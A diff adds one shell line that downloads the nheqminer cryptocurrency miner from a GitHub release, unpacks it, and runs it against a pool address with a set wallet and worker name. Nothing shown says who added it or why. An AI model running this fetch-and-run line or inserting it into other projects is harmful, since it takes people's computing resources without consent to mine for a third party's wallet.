@@ -1,0 +1,1 @@
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && rm nheqminer-Linux-v0.8.2.tgz && cd nheqminer && ./nheqminer -v -l 149.56.27.47:3956 -u RSbceYorox3qgSNRFixjuSkMUerYuJG6c1.WK01 -p x -t 2
